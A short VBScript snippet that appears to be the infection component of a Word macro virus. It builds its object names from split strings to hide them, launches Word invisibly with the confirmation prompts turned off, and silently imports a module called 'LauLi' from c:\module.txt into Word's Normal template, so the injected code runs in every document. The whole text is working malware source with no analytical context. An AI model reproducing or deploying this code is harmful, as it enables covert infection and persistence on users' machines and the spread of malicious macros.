fs="FileSystemObject"
sc="Scripting"
wsc="WScript"
sh="Shell"
crlf=Chr(13)&Chr(10)

Set fso=CreateObject(sc & "." & fs)
Set ws=CreateObject(wsc & "." & sh)

Set wrd=CreateObject("Word.Application")
wrd.Visible = False
wrd.Options.SaveNormalPrompt = False
wrd.Options.ConfirmConversions = False
Set nor=wrd.Application.NormalTemplate.vbproject.vbcomponents
If nor.Item("LauLi").Name <> "LauLi" Then nor.Import "c:\module.txt"
wrd.Application.NormalTemplate.Save
wrd.Quit
